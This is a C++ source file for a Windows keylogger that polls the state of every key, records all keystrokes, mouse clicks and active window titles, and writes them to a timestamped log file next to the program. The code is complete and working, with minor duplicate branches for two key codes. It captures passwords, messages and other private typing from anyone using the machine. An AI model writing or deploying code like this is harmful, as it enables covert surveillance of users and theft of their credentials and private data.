#include "stdafx.h"

#include "main.h"

int main(int argc, char *argv[]){
	printf("%s %d.%d.%d (%s %s)\n", PROJECT_NAME, PROJECT_VERSION_MAJOR, PROJECT_VERSION_MINOR, PROJECT_VERSION_PATCH, __DATE__, __TIME__);
	puts(PROJECT_COPYRIGHT);
	puts("");
	
	
	std::string basepath = dirBasename(getSelfPath());
	
	time_t rawtime;
	struct tm timeinfo;
	time(&rawtime);
	localtime_s(&timeinfo, &rawtime);
	char filename[MAX_PATH];
	char filepath[MAX_PATH];
	strftime(filename, 100, "%Y-%m-%d_%H-%M-%S", &timeinfo);
	//sprintf(filepath, "%s\\%s%s", basepath.c_str(), filename, FILEEXT);
	sprintf_s(filepath, MAX_PATH, "%s\\%s%s", basepath.c_str(), filename, FILEEXT);
	
	//printf("filepath '%s'\n", filepath); exit(0);
	
	
	std::string lastTitle = "";
	std::ofstream klogout(filepath);
	
	//SHORT lastc = 0;
	while(1)
	{
		Sleep(2); // give other programs time to run
		
		// get the active windowtitle
		char title[1024];
		wchar_t title_wchar[1024];
		HWND hwndHandle = GetForegroundWindow();
		GetWindowText(hwndHandle, title_wchar, 1023);

		size_t pReturnValue;
		wcstombs_s(&pReturnValue, title, MAX_PATH, title_wchar, MAX_PATH);


		if(lastTitle != title)
		{
			klogout << std::endl << std::endl << "Window: ";
#ifdef DEBUG
			std::cout << std::endl << std::endl << "Window: ";
#endif
			if(strlen(title) == 0)
			{
				klogout << "NO ACTIVE WINDOW";
#ifdef DEBUG
				std::cout << "NO ACTIVE WINDOW";
#endif
			}
			else
			{
				klogout << "'" << title << "'";
#ifdef DEBUG
				std::cout << "'" << title << "'";
#endif
			}
			klogout << std::endl;
#ifdef DEBUG
			std::cout << std::endl;
#endif
			
			lastTitle = title;
		}
		// logging keys, thats the keylogger
		for (unsigned char c = 1; c < 255; c++)
		{
			SHORT rv = GetAsyncKeyState(c);
			if (rv & 1)
			{ // on press button down
				std::string out = "";
				if (c == 1)
					out = "[LMOUSE]"; // mouse left
				else if (c == 2)
					out = "[RMOUSE]"; // mouse right
				else if (c == 4)
					out = "[MMOUSE]"; // mouse middle
				else if (c == 13)
					out = "[RETURN]";
				else if (c == 16 || c == 17 || c == 18)
					out = "";
				else if (c == 160 || c == 161) // lastc == 16
					out = "[SHIFT]";
				else if (c == 162 || c == 163) // lastc == 17
					out = "[STRG]";
				else if (c == 164) // lastc == 18
					out = "[ALT]";
				else if (c == 165)
					out = "[ALT GR]";
				else if (c == 8)
					out = "[BACKSPACE]";
				else if (c == 9)
					out = "[TAB]";
				else if (c == 27)
					out = "[ESC]";
				else if (c == 33)
					out = "[PAGE UP]";
				else if (c == 34)
					out = "[PAGE DOWN]";
				else if (c == 35)
					out = "[HOME]";
				else if (c == 36)
					out = "[POS1]";
				else if (c == 37)
					out = "[ARROW LEFT]";
				else if (c == 38)
					out = "[ARROW UP]";
				else if (c == 39)
					out = "[ARROW RIGHT]";
				else if (c == 40)
					out = "[ARROW DOWN]";
				else if (c == 45)
					out = "[INS]";
				else if (c == 46)
					out = "[DEL]";
				else if ((c >= 65 && c <= 90)
					|| (c >= 48 && c <= 57)
					|| c == 32)
					out = c;

				else if (c == 91 || c == 92)
					out = "[WIN]";
				else if (c >= 96 && c <= 105)
					out = "[NUM " + intToString(c - 96) + "]";
				else if (c == 106)
					out = "[NUM /]";
				else if (c == 107)
					out = "[NUM +]";
				else if (c == 109)
					out = "[NUM -]";
				else if (c == 109)
					out = "[NUM ,]";
				else if (c >= 112 && c <= 123)
					out = "[F" + intToString(c - 111) + "]";
				else if (c == 144)
					out = "[NUM]";
				else if (c == 192)
					out = "[OE]";
				else if (c == 222)
					out = "[AE]";
				else if (c == 186)
					out = "[UE]";
				else if (c == 186)
					out = "+";
				else if (c == 188)
					out = ",";
				else if (c == 189)
					out = "-";
				else if (c == 190)
					out = ".";
				else if (c == 191)
					out = "#";
				else if (c == 226)
					out = "<";

				else
					out = "[KEY \\" + intToString(c) + "]";
				std::cout << "OUT = " << out << "\n";
				
#ifdef DEBUG
				std::cout << ">" << out << "< (" << (unsigned)c << ")" << std::endl;
#endif
				klogout << out;
				klogout.flush();
				
				//lastc = c;
			}
		}
		
	}
	
	klogout.close();
	
	return 0;
}
